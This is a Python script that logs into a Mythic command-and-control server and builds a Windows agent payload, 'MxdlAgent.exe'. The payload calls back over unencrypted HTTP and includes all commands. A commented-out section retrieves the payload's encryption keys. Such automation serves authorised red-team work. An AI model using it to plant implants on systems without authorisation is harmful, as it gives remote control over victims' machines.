import asyncio
import logging

from mythic import mythic


async def main():
    mythic_login_username = "mythic_admin"
    mythic_login_password = "<Mythic_Password>"
    mythic_host = "127.0.0.1"  # or your remote server

    callback_host = f"http://{mythic_host}"
    callback_port = 80
    agent_name = "mxdl_agent"

    print(
        f"[*] Connecting to Mythic at {mythic_host} with username {mythic_login_username}"
    )
    mythic_instance = await mythic.login(
        username=mythic_login_username,
        password=mythic_login_password,
        server_ip=mythic_host,
        server_port=7443,
        logging_level=logging.WARNING,
    )

    print(f"[*] Creating {agent_name} agent that will callback to {callback_host} on port {callback_port}")

    resp = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name=agent_name,
        filename="MxdlAgent.exe",
        operating_system="Windows",
        include_all_commands=True,
        c2_profiles=[
            {
                "c2_profile": "http",
                "c2_profile_parameters": {
                    "callback_host": callback_host,
                    "callback_port": callback_port,
                    "AESPSK": "none",
                },
            }
        ],
        build_parameters=[
            {"name": "output", "value": "py"},
        ],
        return_on_complete=False,
    )

    print(resp)

    # if resp["status"] == "success":
    #     print(f"[*] New UUID is: {resp['uuid']}")
    #     payload_info = await mythic.get_payload_by_uuid(
    #         mythic=mythic_instance,
    #         payload_uuid=resp["uuid"],
    #         custom_return_attributes="""
    #         c2profileparametersinstances {
	#             enc_key_base64
	#             dec_key_base64
	#             value
	#             c2profileparameter {
	# 	            name
	# 	        }
	# 	        c2profile {
	# 		        name
	# 		    }
	# 		}
	# 		""",
    #     )
    #     for c2param in payload_info["c2profileparametersinstances"]:
    #         if c2param["c2profileparameter"]["name"] == "AESPSK":
    #             print(f"[*] New Encryption key: {c2param['enc_key_base64']}")
    #     print(payload_info)
    # else:
    #     print(resp)


try:
    asyncio.run(main())
except Exception as e:
    pass
